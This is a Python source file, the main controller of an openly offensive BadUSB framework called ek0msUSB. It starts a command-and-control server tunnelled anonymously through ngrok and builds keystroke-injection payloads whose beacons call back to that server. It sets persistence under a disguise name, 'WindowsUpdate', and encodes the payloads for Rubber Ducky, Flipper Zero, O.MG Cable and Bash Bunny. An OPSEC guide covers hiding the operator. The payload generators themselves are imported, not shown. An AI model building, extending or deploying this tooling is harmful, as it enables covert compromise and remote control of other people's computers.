#!/usr/bin/env python3
""" 
ek0msUSB Main Controller 
Usage: python ek0msusb.py (for interactive mode) or python ek0msusb.py --build --beacon-type simple --c2-url https://your-c2.ngrok.io
"""

import argparse
import os
import sys
import time
import threading
from pathlib import Path

# Add the current directory to Python path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Global variable to store the C2 URL
current_c2_url = None

def clear_screen():
    """Clear the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Print the awesome ek0msUSB banner"""
    banner = """
           ░██         ░████                              ░██     ░██   ░██████   ░████████   
           ░██        ░██ ░██                             ░██     ░██  ░██   ░██  ░██    ░██  
 ░███████  ░██    ░██░██ ░████ ░█████████████   ░███████  ░██     ░██ ░██         ░██    ░██  
░██    ░██ ░██   ░██ ░██░██░██ ░██   ░██   ░██ ░██        ░██     ░██  ░████████  ░████████   
░█████████ ░███████  ░████ ░██ ░██   ░██   ░██  ░███████  ░██     ░██         ░██ ░██     ░██ 
░██        ░██   ░██  ░██ ░██  ░██   ░██   ░██        ░██  ░██   ░██   ░██   ░██  ░██     ░██ 
 ░███████  ░██    ░██  ░████   ░██   ░██   ░██  ░███████    ░██████     ░██████   ░█████████  
                                                                                                                                                                                            
                                                                                                  
     Advanced BadUSB Payload Framework by ek0msSavi0r 
    """
    print(banner)

def interactive_menu():
    """Interactive menu system for ek0msUSB"""
    global current_c2_url
    
    while True:
        clear_screen()
        print_banner()
        
        # Show current C2 status
        if current_c2_url:
            print(f" ACTIVE C2: {current_c2_url}")
        else:
            print(" C2: Not configured")
        
        print("=" * 50)
        print("1.  Build BadUSB Payload")
        print("2.  Start C2 Server") 
        print("3.  View Framework Info")
        print("4.  OPSEC Guide")
        print("5.  Exit")
        print("=" * 50)
        
        choice = input("\nSelect an option (1-5): ").strip()
        
        if choice == "1":
            build_payload_interactive()
        elif choice == "2":
            start_c2_interactive()
        elif choice == "3":
            show_framework_info()
        elif choice == "4":
            show_opsec_guide()
        elif choice == "5":
            print("\n Hack the Planet! Stay stealthy! ")
            break
        else:
            print(" Invalid option. Please try again.")
            time.sleep(1)

def build_payload_interactive():
    """Interactive payload building with generated beacons"""
    global current_c2_url
    
    clear_screen()
    print(" BUILD BADUSB PAYLOAD")
    print("=" * 50)
    
    # Get C2 URL first (most important)
    if not current_c2_url:
        print(" No C2 server active! Please start C2 server first.")
        input("Press Enter to return to menu...")
        return
    
    print(f" Using C2 URL: {current_c2_url}")
    
    # Get beacon type
    print("\n SELECT BEACON TYPE:")
    print("1. Simple Beacon (Recommended for testing)")
    print("2. Stealth Beacon (No console - operational)")
    print("3. Advanced Beacon (Command execution capabilities)")
    
    beacon_choice = input("Select beacon type (1-3): ").strip()
    beacon_types = { "1": "simple", "2": "stealth", "3": "advanced" }
    beacon_type = beacon_types.get(beacon_choice, "simple")
    
    # Get payload delivery method
    print("\n SELECT DELIVERY METHOD:")
    print("1. In-Memory (Stealthy - Recommended)")
    print("2. Disk-Based (Reliable)")
    print("3. Hybrid (Balanced)")
    
    type_choice = input("Select delivery method (1-3): ").strip()
    payload_types = { "1": "in_memory", "2": "disk_based", "3": "hybrid" }
    payload_type = payload_types.get(type_choice, "in_memory")
    
    # Get output name
    output_name = input("Enter persistence name (default: WindowsUpdate): ").strip()
    if not output_name:
        output_name = "WindowsUpdate"
    
    # Get output file
    output_file = input("Enter output file (default: payload.txt): ").strip()
    if not output_file:
        output_file = "payload.txt"
    
    # Build the payload with generated beacon
    try:
        from generators.payload_builder import PayloadBuilder
        builder = PayloadBuilder()
        
        print(f"\n[*] Generating {beacon_type} beacon and building payload...")
        print("[*] This may take a moment while we compile the beacon...")
        
        script = builder.build_badusb_script(beacon_type, payload_type, output_name, current_c2_url)
        
        with open(output_file, 'w') as f:
            f.write(script)
        
        print(f"\n SUCCESS! Payload built: {output_file}")
        print(f" Beacon Type: {beacon_type}")
        print(f" Delivery Method: {payload_type}")
        print(f" C2 URL: {current_c2_url}")
        print(f" Output: {output_file}")
        print(f" Size: {os.path.getsize(output_file)} bytes")
        
        # OPSEC warnings
        if "localhost" in current_c2_url or "127.0.0.1" in current_c2_url:
            print("\n OPSEC WARNING: Payload contains localhost!")
            print("   This will expose your IP address in operations!")
            print("   Use ngrok or a VPS for real assessments.")
        
        # AUTO-ENCODING SECTION
        print("\n" + "="*50)
        print(" AUTO-ENCODING PAYLOADS")
        print("="*50)
        
        try:
            from utils.encoder import PayloadEncoder
            encoder = PayloadEncoder()
            
            if encoder.check_dependencies():
                print("[*] Encoding payload for multiple devices...")
                
                # Create encoded_payloads directory
                encoded_dir = "encoded_payloads"
                os.makedirs(encoded_dir, exist_ok=True)
                
                base_name = Path(output_file).stem
                encoded_files = {}
                
                # Encode for Rubber Ducky
                try:
                    ducky_file = os.path.join(encoded_dir, f"{base_name}_ducky.bin")
                    encoded_files['Rubber Ducky'] = encoder.encode_for_rubber_ducky(output_file, ducky_file)
                    print(f"[+] Rubber Ducky: {ducky_file}")
                except Exception as e:
                    print(f"[-] Rubber Ducky encoding failed: {e}")
                
                # Encode for Flipper Zero
                try:
                    flipper_file = os.path.join(encoded_dir, f"{base_name}_flipper.txt")
                    encoded_files['Flipper Zero'] = encoder.encode_for_flipper_zero(output_file, flipper_file)
                    print(f"[+] Flipper Zero: {flipper_file}")
                except Exception as e:
                    print(f"[-] Flipper Zero encoding failed: {e}")
                
                # Encode for O.MG Cable
                try:
                    omicron_file = os.path.join(encoded_dir, f"{base_name}_omicron.txt")
                    encoded_files['O.MG Cable'] = encoder.encode_for_omicron(output_file, omicron_file)
                    print(f"[+] O.MG Cable: {omicron_file}")
                except Exception as e:
                    print(f"[-] O.MG Cable encoding failed: {e}")
                
                # Encode for Bash Bunny
                try:
                    bashbunny_file = os.path.join(encoded_dir, f"{base_name}_bashbunny.txt")
                    encoded_files['Bash Bunny'] = encoder.encode_for_omicron(output_file, bashbunny_file)
                    print(f"[+] Bash Bunny: {bashbunny_file}")
                except Exception as e:
                    print(f"[-] Bash Bunny encoding failed: {e}")
                
                print(f"\n[*] Encoded payloads saved to: {encoded_dir}")
                
            else:
                print("[-] Duck Toolkit not installed. Manual encoding required.")
                print("    Install with: pip install ducktoolkit")
                
        except Exception as e:
            print(f"[-] Auto-encoding failed: {e}")
            print("    You can manually encode the payload using Duck Toolkit")
        
        print("\n" + "="*50)
        print(" NEXT STEPS")
        print("="*50)
        print("1. Original Ducky Script: payload.txt")
        print("2. Encoded versions ready in: encoded_payloads/")
        print("3. Flash the appropriate file to your device:")
        print("   • Rubber Ducky: .bin file")
        print("   • Flipper Zero: _flipper.txt file") 
        print("   • O.MG Cable: _omicron.txt file")
        print("   • Bash Bunny: _bashbunny.txt file")
        print("4. Deploy and watch for beacons!")
        
    except Exception as e:
        print(f" Error building payload: {e}")
        print(" Troubleshooting tips:")
        print("   • Make sure PyInstaller is installed: pip install pyinstaller")
        print("   • Ensure you're using Python 3.8 or 3.9")
        print("   • Check that the C2 server is running")
    
    input("\nPress Enter to continue...")

def start_c2_interactive():
    """Interactive C2 server startup with ngrok"""
    global current_c2_url
    
    clear_screen()
    print(" START C2 SERVER")
    print("=" * 50)
    
    # OPSEC configuration
    print(" OPSEC CONFIGURATION:")
    print("1. Use ngrok tunnel (Recommended - Anonymous)")
    print("2. Use localhost only (Testing)")
    
    opsec_choice = input("Select mode (1-2, default 1): ").strip()
    use_ngrok = opsec_choice != "2"
    
    if use_ngrok:
        print(" Ngrok enabled - Anonymous C2 tunnel")
    else:
        print("  Localhost only - Not for operations!")
    
    port = input("Enter port (default: 5000): ").strip()
    if not port:
        port = 5000
    else:
        try:
            port = int(port)
        except:
            port = 5000
    
    print(f"\n Starting C2 server on port {port}...")
    
    try:
        # We need to run the server in a way that captures the URL properly
        print("[*] Starting server and ngrok tunnel...")
        
        # Import the C2Server class directly to get better control
        from c2_server.server import C2Server
        c2 = C2Server()
        c2.print_banner()
        
        if use_ngrok:
            # Start ngrok and get the URL immediately
            current_c2_url = c2.start_ngrok_tunnel(port)
            print(f"[+] Ngrok URL captured: {current_c2_url}")
        else:
            current_c2_url = f"http://localhost:{port}"
            print(f"[+] Using localhost URL: {current_c2_url}")
        
        # Now start the Flask server in a background thread
        def run_flask():
            from c2_server.server import app
            print("[*] Starting Flask server in background...")
            app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
        
        flask_thread = threading.Thread(target=run_flask, daemon=True)
        flask_thread.start()
        
        # Give it a moment to start
        time.sleep(2)
        
        if current_c2_url:
            print(f" C2 server started successfully!")
            print(f" Public URL: {current_c2_url}")
            print(f" Local URL: http://localhost:{port}")
            print(f" Admin Panel: {current_c2_url}/admin")
            
            print("\n Payload Configuration:")
            print(f"   Use this C2 URL: {current_c2_url}")
            print("   This URL will be embedded in your payloads")
            
        else:
            print(" Failed to get C2 URL")
            current_c2_url = f"http://localhost:{port}"
            print(f" Using fallback: {current_c2_url}")
        
        print("\n Server running in background...")
        print(" You can now build payloads using the C2 URL above!")
        input("Press Enter to return to menu...")
        
    except Exception as e:
        print(f" Error starting C2 server: {e}")
        input("Press Enter to continue...")

def show_framework_info():
    """Display framework information"""
    global current_c2_url
    
    clear_screen()
    print(" EK0MSUSB FRAMEWORK INFO")
    print("=" * 50)
    
    if current_c2_url:
        print(f" Active C2: {current_c2_url}")
    else:
        print(" C2: Not active")
    
    # Count files
    total_files = 0
    for root, dirs, files in os.walk("."):
        total_files += len([f for f in files if not f.startswith('.') and not f.endswith('.pyc')])
    
    print(f" Total Files: {total_files}")
    print("  Components:")
    print("   • Beacon Generator ✓")
    print("   • Payload Builder ✓")
    print("   • C2 Server with Ngrok ✓") 
    print("   • Interactive Menu ✓")
    print("   • Obfuscation Tools ✓")
    print("   • Auto-Encoder ✓")
    
    print("\n Features:")
    print("   • Dynamic Beacon Generation")
    print("   • In-Memory Execution")
    print("   • Multiple Persistence Methods")
    print("   • Anonymous C2 via Ngrok")
    print("   • Real-time Beacon Monitoring")
    print("   • Multi-Device Auto-Encoding")
    
    input("\nPress Enter to continue...")

def show_opsec_guide():
    """Display OPSEC guide"""
    clear_screen()
    print(" EK0MSUSB OPSEC GUIDE")
    print("=" * 50)
    
    print("\n CRITICAL OPSEC RULES:")
    print("1. ALWAYS use ngrok or a VPS for real operations")
    print("2. NEVER use localhost in production payloads")
    print("3. Test in isolated environments first")
    print("4. Use VPN during development")
    print("5. Keep your GitHub repository PRIVATE")
    
    print("\n RECOMMENDED WORKFLOW:")
    print("1. Start C2 server with ngrok enabled")
    print("2. Note the provided ngrok URL")
    print("3. Build payloads using that URL")
    print("4. Auto-encode for your specific device")
    print("5. Deploy payloads - they call back anonymously")
    print("6. Monitor beacons through the ngrok tunnel")
    
    print("\n Supported Devices:")
    print("• Rubber Ducky (.bin files)")
    print("• Flipper Zero (.txt files)")
    print("• O.MG Cable (.txt files)")
    print("• Bash Bunny (.txt files)")
    
    print("\n Ngrok Setup:")
    print("• Install: pip install pyngrok")
    print("• Free account: ngrok.com")
    print("• Custom subdomains available with account")
    
    input("\nPress Enter to continue...")

def show_help():
    """Display help information"""
    clear_screen()
    print(" EK0MSUSB HELP & DOCUMENTATION")
    print("=" * 50)
    
    print("\n Quick Start Guide:")
    print("1. Start C2 server first (option 2)")
    print("2. Note the ngrok URL provided")
    print("3. Build payloads (option 1) - auto-encoding included!")
    print("4. Deploy and monitor beacons!")
    
    print("\n Command Line Usage:")
    print("python ek0msusb.py --build --beacon-type stealth --c2-url https://your-url.ngrok.io")
    print("python ek0msusb.py --start-c2 --port 5000 --use-ngrok")
    print("python ek0msusb.py --interactive")
    
    print("\n Auto-Encoding Features:")
    print("• Rubber Ducky: .bin files")
    print("• Flipper Zero: .txt files")
    print("• O.MG Cable: .txt files")
    print("• Bash Bunny: .txt files")
    
    print("\n Support:")
    print("• GitHub: github.com/ekomsSavior/ek0msUSB")
    
    input("\nPress Enter to continue...")

def main():
    """Main function with both interactive and CLI support"""
    parser = argparse.ArgumentParser(description='ek0msUSB Framework')
    parser.add_argument('--build', action='store_true', help='Build BadUSB payload')
    parser.add_argument('--beacon-type', choices=['simple', 'stealth', 'advanced'], 
                       default='simple', help='Type of beacon to generate')
    parser.add_argument('--payload-type', choices=['in_memory', 'disk_based', 'hybrid'], 
                       default='in_memory', help='Payload delivery method')
    parser.add_argument('--output', default='payload.txt', help='Output file name')
    parser.add_argument('--output-name', default='WindowsUpdate', help='Persistence name')
    parser.add_argument('--c2-url', help='C2 server URL (required for CLI mode)')
    parser.add_argument('--start-c2', action='store_true', help='Start C2 server')
    parser.add_argument('--port', type=int, default=5000, help='C2 server port')
    parser.add_argument('--use-ngrok', action='store_true', help='Use ngrok tunnel')
    parser.add_argument('--interactive', action='store_true', help='Start interactive mode')
    
    args = parser.parse_args()
    
    # Show banner
    print_banner()
    
    # Determine mode
    if args.interactive or (not args.build and not args.start_c2):
        # Interactive mode
        interactive_menu()
    else:
        # CLI mode
        if args.build:
            if not args.c2_url:
                print(" Error: --c2-url argument required for CLI mode")
                print(" Get C2 URL by starting server first: python ek0msusb.py --start-c2 --use-ngrok")
                return
            
            try:
                from generators.payload_builder import PayloadBuilder
                builder = PayloadBuilder()
                script = builder.build_badusb_script(
                    args.beacon_type, 
                    args.payload_type, 
                    args.output_name, 
                    args.c2_url
                )
                
                with open(args.output, 'w') as f:
                    f.write(script)
                
                print(f" Payload built: {args.output}")
                print(f" Beacon Type: {args.beacon_type}")
                print(f" Delivery Method: {args.payload_type}")
                print(f" C2 URL: {args.c2_url}")
                
                # Auto-encoding for CLI mode (optional enhancement)
                print("\n[*] Note: For auto-encoding, use interactive mode or run:")
                print(f"    python ek0msusb.py --interactive")
                
            except Exception as e:
                print(f" Error: {e}")
                print(" Make sure PyInstaller is installed: pip install pyinstaller")
        
        if args.start_c2:
            try:
                # For CLI mode, use the same improved approach
                from c2_server.server import C2Server
                c2 = C2Server()
                
                if args.use_ngrok:
                    c2_url = c2.start_ngrok_tunnel(args.port)
                else:
                    c2_url = f"http://localhost:{args.port}"
                
                print(f" Starting C2 server on port {args.port}...")
                print(f" C2 URL: {c2_url}")
                
                # Start Flask server
                from c2_server.server import app
                app.run(host='0.0.0.0', port=args.port, debug=False)
                
            except Exception as e:
                print(f" Error: {e}")

if __name__ == "__main__":
    main()